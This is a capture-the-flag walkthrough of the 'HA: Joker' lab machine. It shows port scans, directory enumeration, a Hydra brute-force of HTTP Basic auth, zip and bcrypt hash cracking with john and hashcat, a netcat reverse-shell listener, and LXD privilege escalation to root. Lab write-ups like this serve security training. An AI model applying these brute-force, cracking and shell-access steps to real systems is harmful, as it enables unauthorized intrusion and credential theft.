# What Apache version is it?

**2.4.29**

- Enumerated services on the target with `rustscan`

```console
❯ rustscan -a 10.10.217.163  --ulimit 5000 -- -sC -sV | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.217.163:22
Open 10.10.217.163:80
Open 10.10.217.163:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-12 19:26 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Initiating Ping Scan at 19:26
Scanning 10.10.217.163 [2 ports]
Completed Ping Scan at 19:26, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:26
Completed Parallel DNS resolution of 1 host. at 19:26, 5.50s elapsed
DNS resolution of 1 IPs took 5.50s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 19:26
Scanning 10.10.217.163 [3 ports]
Discovered open port 22/tcp on 10.10.217.163
Discovered open port 80/tcp on 10.10.217.163
Discovered open port 8080/tcp on 10.10.217.163
Completed Connect Scan at 19:26, 0.15s elapsed (3 total ports)
Initiating Service scan at 19:26
Scanning 3 services on 10.10.217.163
Completed Service scan at 19:26, 6.42s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.217.163.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 4.77s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.72s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Nmap scan report for 10.10.217.163
Host is up, received syn-ack (0.15s latency).
Scanned at 2022-12-12 19:26:46 IST for 12s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL89x6yGLD8uQ9HgFK1nvBGpjT6KJXIwZZ56/pjgdRK/dOSpvl0ckMaa68V9bLHvn0Oerh2oa4Q5yCnwddrQnm7JHJ4gNAM+lg+ML7+cIULAHqXFKPpPAjvEWJ7T6+NRrLc9q8EixBsbEPuNer4tGGyUJXg6GpjWL5jZ79TwZ80ANcYPVGPZbrcCfx5yR/1KBTcpEdUsounHjpnpDS/i+2rJ3ua8IPUrqcY3GzlDcvF7d/+oO9GxQ0wjpy1po6lDJ/LytU6IPFZ1Gn/xpRsOxw0N35S7fDuhn69XlXj8xiDDbTlOhD4sNxckX0veXKpo6ynQh5t3yM5CxAQdqRKgFF
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOzF9YUxQxzgUVsmwq9ZtROK9XiPOB0quHBIwbMQPScfnLbF3/Fws+Ffm/l0NV7aIua0W7FLGP3U4cxZEDFIzfQ=
|   256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLWfYB8/GSsvhS7b9c6hpXJCO6p1RvLsv4RJMvN4B3r
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    syn-ack Apache httpd 2.4.29
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.16 seconds
```

 
# What port on this machine not need to be authenticated by user and password?

**80**

```console
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
```

#  There is a file on this port that seems to be secret, what is it?

**secret.txt**

- Started `goboster` on port 80 and found `secret.txt`

```console
❯ gobuster dir --url http://10.10.217.163 -w /usr/share/wordlists/dirb/common.txt  -x php,js,txt,html  | tee gobuster:80.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.217.163
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,txt,html
[+] Timeout:                 10s
===============================================================
2022/12/12 19:27:12 Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 278]
/.hta.js              (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.htpasswd.js         (Status: 403) [Size: 278]
/.htaccess.js         (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.217.163/css/]
/img                  (Status: 301) [Size: 312] [--> http://10.10.217.163/img/]
/index.html           (Status: 200) [Size: 5954]                               
/index.html           (Status: 200) [Size: 5954]                               
/phpinfo.php          (Status: 200) [Size: 94775]                              
/phpinfo.php          (Status: 200) [Size: 94775]                              
/secret.txt           (Status: 200) [Size: 320]                                
/server-status        (Status: 403) [Size: 278]  
```

# There is another file which reveals information of the backend, what is it?

**phpinfo.php**

```console
/phpinfo.php          (Status: 200) [Size: 94775]     
```


# When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?

**joker**

```console
❯ curl http://10.10.217.163/secret.txt
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

# What port on this machine need to be authenticated by Basic Authentication Mechanism?

**8080**

```console
8080/tcp open  http    syn-ack Apache httpd 2.4.29
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?

**hannah**

- Started `hydra` on the port 8080 for `http-get` and found password `hannah`

```console
❯ hydra -l joker -P /usr/share/wordlists/rockyou.txt -f  10.10.217.163 -s 8080  http-get / -o hydra.log  -t 64 -I
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-12 19:37:23
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.217.163:8080/
[8080][http-get] host: 10.10.217.163   login: joker   password: hannah
[STATUS] attack finished for 10.10.217.163 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-12 19:37:51
```


# Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?


**/administrator/**

- Started `nikto` and found `/administrator/` 

```cosnole
❯ nikto -host http://10.10.217.163:8080 -id joker:hannah  | tee nikto.log
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.217.163
+ Target Hostname:    10.10.217.163
+ Target Port:        8080
+ Start Time:         2022-12-12 19:49:27 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm ' Please enter the password.'
+ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
+ Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 14 entries which should be manually viewed.
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ /backup.zip: Potentially interesting archive/cert file found.
+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /web.config: ASP config file is accessible.
```

# We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?

**backup.zip** 

```console
+ /backup.zip: Potentially interesting archive/cert file found.
+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
```

- Downloaded this file

```console
❯ wget http://10.10.217.163:8080/backup.zip  --http-user="joker" --http-password="hannah"
--2022-12-12 20:00:52--  http://10.10.217.163:8080/backup.zip
Connecting to 10.10.217.163:8080... connected.
HTTP request sent, awaiting response... 401 Unauthorized
Authentication selected: Basic realm=" Please enter the password."
Reusing existing connection to 10.10.217.163:8080.
HTTP request sent, awaiting response... 200 OK
Length: 12133560 (12M) [application/zip]
Saving to: ‘backup.zip’

backup.zip             100%[============================>]  11.57M  2.26MB/s    in 5.6s    

2022-12-12 20:00:58 (2.06 MB/s) - ‘backup.zip’ saved [12133560/12133560]
```


# We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?


**hannah**

- Used `zip2john` to create a hash 

```console
❯ zip2john backup.zip  > hash
<--------------snip-------------->
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_articles_archive.ini PKZIP Encr: TS_chk, cmplen=424, decmplen=678, crc=450529DA ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_menu.ini PKZIP Encr: TS_chk, cmplen=849, decmplen=1889, crc=2697BAE7 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.com_weblinks.ini PKZIP Encr: TS_chk, cmplen=975, decmplen=2337, crc=67266221 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_articles_categories.sys.ini PKZIP Encr: TS_chk, cmplen=303, decmplen=436, crc=765DB387 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.com_config.ini PKZIP Encr: TS_chk, cmplen=1052, decmplen=2566, crc=4AF59992 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_whosonline.ini PKZIP Encr: TS_chk, cmplen=711, decmplen=1540, crc=FE57AF12 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_languages.sys.ini PKZIP Encr: TS_chk, cmplen=934, decmplen=1995, crc=8A6EB5FE ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.com_media.ini PKZIP Encr: TS_chk, cmplen=1796, decmplen=5024, crc=23F89C70 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_search.ini PKZIP Encr: TS_chk, cmplen=921, decmplen=2449, crc=ED9827A8 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.com_wrapper.ini PKZIP Encr: TS_chk, cmplen=274, decmplen=351, crc=97264C3C ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_syndicate.sys.ini PKZIP Encr: TS_chk, cmplen=307, decmplen=434, crc=8C713D66 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_breadcrumbs.ini PKZIP Encr: TS_chk, cmplen=516, decmplen=1177, crc=9199DA04 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_weblinks.ini PKZIP Encr: TS_chk, cmplen=839, decmplen=2459, crc=7A2616AE ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.com_content.ini PKZIP Encr: TS_chk, cmplen=1869, decmplen=5422, crc=ABEDB371 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_articles_latest.ini PKZIP Encr: TS_chk, cmplen=743, decmplen=1898, crc=7195AB5A ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.lib_phpass.sys.ini PKZIP Encr: TS_chk, cmplen=440, decmplen=689, crc=4A8D0C2F ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.lib_fof.ini PKZIP Encr: TS_chk, cmplen=308, decmplen=483, crc=06BB99F8 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.files_joomla.sys.ini PKZIP Encr: TS_chk, cmplen=343, decmplen=507, crc=F8D4A267 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.com_messages.ini PKZIP Encr: TS_chk, cmplen=325, decmplen=457, crc=58DC1AFE ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_login.ini PKZIP Encr: TS_chk, cmplen=998, decmplen=2453, crc=839F9707 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_whosonline.sys.ini PKZIP Encr: TS_chk, cmplen=343, decmplen=485, crc=D2A3114C ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.mod_finder.ini PKZIP Encr: TS_chk, cmplen=1129, decmplen=3274, crc=9DE81C90 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.ini PKZIP Encr: TS_chk, cmplen=6345, decmplen=16201, crc=C4F9EACC ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/language/en-GB/en-GB.lib_joomla.ini PKZIP Encr: TS_chk, cmplen=14146, decmplen=60430, crc=707CFA91 ts=433A cs=433a type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/web.config.txt PKZIP Encr: TS_chk, cmplen=561, decmplen=1690, crc=7D14F65A ts=433B cs=433b type=8
ver 2.0 efh 5455 efh 7875 backup.zip/site/htaccess.txt PKZIP Encr: TS_chk, cmplen=1388, decmplen=3005, crc=EC3D5F4A ts=433A cs=433a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

- Cracked hash with `john`

```console
❯ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hannah           (backup.zip)     
1g 0:00:00:00 DONE (2022-12-12 20:13) 14.28g/s 58514p/s 58514c/s 58514C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

# Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?

**admin**

- We have `joomladb.sql` stored in `/db/` 
- Created a new database named joker on `mysql` on local system.

```console
❯ sudo mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 140
Server version: 10.6.8-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> CREATE DATABASE joker;
Query OK, 1 row affected (0.000 sec)

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| joker              |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
6 rows in set (0.000 sec)
```

- Imported `joomladb.sql`

```console
❯ sudo mysql -u root -p  joker  < joomladb.sql
Enter password: 
```

- Checked out table `cc1gr_users`

```console
❯ sudo mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 157
Server version: 10.6.8-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> USE joker;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [joker]> show tables;
+-------------------------------+
| Tables_in_joker               |
+-------------------------------+
| cc1gr_assets                  |
| cc1gr_associations            |
| cc1gr_banner_clients          |
| cc1gr_banner_tracks           |
| cc1gr_banners                 |
| cc1gr_categories              |
| cc1gr_contact_details         |
<-------------------snip--------------------->
| cc1gr_user_keys               |
| cc1gr_user_notes              |
| cc1gr_user_profiles           |
| cc1gr_user_usergroup_map      |
| cc1gr_usergroups              |
| cc1gr_users                   |
| cc1gr_utf8_conversion         |
| cc1gr_viewlevels              |
+-------------------------------+
72 rows in set (0.001 sec)


```

```console
MariaDB [joker]> DESC cc1gr_users;
+---------------+---------------+------+-----+---------------------+----------------+
| Field         | Type          | Null | Key | Default             | Extra          |
+---------------+---------------+------+-----+---------------------+----------------+
| id            | int(11)       | NO   | PRI | NULL                | auto_increment |
| name          | varchar(400)  | NO   | MUL |                     |                |
| username      | varchar(150)  | NO   | MUL |                     |                |
| email         | varchar(100)  | NO   | MUL |                     |                |
| password      | varchar(100)  | NO   |     |                     |                |
| block         | tinyint(4)    | NO   | MUL | 0                   |                |
| sendEmail     | tinyint(4)    | YES  |     | 0                   |                |
| registerDate  | datetime      | NO   |     | 0000-00-00 00:00:00 |                |
| lastvisitDate | datetime      | NO   |     | 0000-00-00 00:00:00 |                |
| activation    | varchar(100)  | NO   |     |                     |                |
| params        | text          | NO   |     | NULL                |                |
| lastResetTime | datetime      | NO   |     | 0000-00-00 00:00:00 |                |
| resetCount    | int(11)       | NO   |     | 0                   |                |
| otpKey        | varchar(1000) | NO   |     |                     |                |
| otep          | varchar(1000) | NO   |     |                     |                |
| requireReset  | tinyint(4)    | NO   |     | 0                   |                |
+---------------+---------------+------+-----+---------------------+----------------+
16 rows in set (0.001 sec)

MariaDB [joker]> select name,username,password from cc1gr_users;
+------------------+----------+--------------------------------------------------------------+
| name             | username | password                                                     |
+------------------+----------+--------------------------------------------------------------+
| Super Duper User | admin    | $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG |
+------------------+----------+--------------------------------------------------------------+
1 row in set (0.000 sec)

```


# Super Duper User! What is the password?

**abcd1234**

- `$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG` this is `bcrypt` hash, which can be brute-forced with `hashcat`

```console
❯ hashcat --help | grep bcrypt
   3200 | bcrypt $2*$, Blowfish (Unix)                        | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                      | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                    | Forums, CMS, E-Commerce
```

- Started `hashcat`

```console
❯ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 3 3250U with Radeon Graphics, 993/2050 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG:abcd1234
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj...unOcbG
Time.Started.....: Mon Dec 12 20:29:08 2022 (47 secs)
Time.Estimated...: Mon Dec 12 20:29:55 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       22 H/s (5.87ms) @ Accel:2 Loops:64 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 1022/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
Candidate.Engine.: Device Generator
Candidates.#1....: abcd1234 -> bethany
Hardware.Mon.#1..: Util:  0%

Started: Mon Dec 12 20:29:06 2022
Stopped: Mon Dec 12 20:29:57 2022
```

# At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?

**www-data** 

- Found [this](https://www.hackingarticles.in/joomla-reverse-shell/) blog on uploading shell.
- Got a shell

```console
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.217.163] 58014
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:14:07 up  1:19,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
bash: cannot set terminal process group (640): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/$ 
```

# What is the name of the file in the /root directory?

**final.txt**

- Followed [this](https://www.hackingarticles.in/lxd-privilege-escalation/) blog and got a shell


```console
~ # whoami
root
~ # cd /mnt
/mnt # ls
root
/mnt # cd root
/mnt/root # ls
bin             lib             root            usr
boot            lib64           run             var
dev             lost+found      sbin            vmlinuz
etc             media           srv             vmlinuz.old
home            mnt             swapfile
initrd.img      opt             sys
initrd.img.old  proc            tmp
/mnt/root # cd root
/mnt/root/root # ls
final.txt
/mnt/root/root # cat final.txt

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!		
							
Contact us here:						
								
Hacking Articles : https://twitter.com/rajchandel/		
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114								
								
+-+-+-+-+-+ +-+-+-+-+-+-+-+					
 |E|n|j|o|y| |H|A|C|K|I|N|G|			
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
```